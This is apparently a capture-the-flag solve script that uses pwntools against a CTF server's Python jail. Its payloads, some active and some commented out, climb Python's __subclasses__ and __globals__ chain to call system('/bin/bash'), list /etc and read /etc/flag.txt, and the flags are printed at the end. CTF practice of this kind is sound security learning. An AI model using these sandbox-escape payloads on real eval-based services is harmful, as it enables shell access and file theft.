from pwn import *

p = remote("pwn.ctf.ae", 9816)

# this worked but the author didn't gib me points for my unintented soln (T-T)
pl = "open('/etc/flag.txt').read()"

# pl = "(1).__class__.__base__.__subclasses__()"
# pl = "(1).__class__.__base__.__subclasses__().__class_getitem__((1).__class__)('1')"
# pl = "(1).__class__.__base__.__subclasses__().pop(7)('aaaa')"
# pl = "''.__class__.__base__.__subclasses__().pop(134).__init__.__globals__"
# pl = "''.__class__.__base__.__subclasses__().pop(134).__init__.__globals__.pop('system')('/bin/bash')"
# pl = "''.__class__.__base__.__subclasses__().pop(134).__init__.__globals__.pop('listdir')('/etc')"
pl = "''.__class__.__base__.__subclasses__().pop(134).__init__.__globals__.pop('__builtins__').pop('open')('/etc/flag.txt').read()"

p.recv()
p.sendline(pl)
p.interactive()

# CTFAE{DoNotBeSadThisIsTheLastPwn}
# CTFAE{LooksLikeYouKnowYourPythonWell}
